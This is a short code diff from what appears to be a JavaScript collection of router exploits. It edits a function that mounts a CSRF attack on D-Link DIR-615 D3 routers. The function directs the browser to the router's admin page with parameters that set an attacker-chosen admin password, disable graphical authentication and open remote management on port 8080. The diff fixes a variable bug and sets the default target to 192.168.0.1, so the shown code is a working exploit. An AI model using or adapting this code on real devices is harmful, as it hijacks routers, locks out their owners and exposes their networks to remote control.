@@ -471,8 +471,8 @@ function dsl2750u_bypassauth(ip)
 // D-Link DIR-615 D3 - Change Admin Password CSRF
 function d615d3_changepass(ip)
 {
-	ip = ip || "192.168.178.155";
-	password = prompt("New Password:");
+	ip = ip || "192.168.0.1";
+	pass = prompt("New Password:");
 	url = "/tools_admin.php?ACTION_POST=1&apply=Save+Settings&admin_name=admin&admin_password1=" + pass + "&admin_password2=" + pass + "&grap_auth_enable_h=0&rt_enable=on&rt_enable_h=1&rt_ipaddr=0.0.0.0&rt_port=8080";
 	document.location="http://"+ip+url;
 }
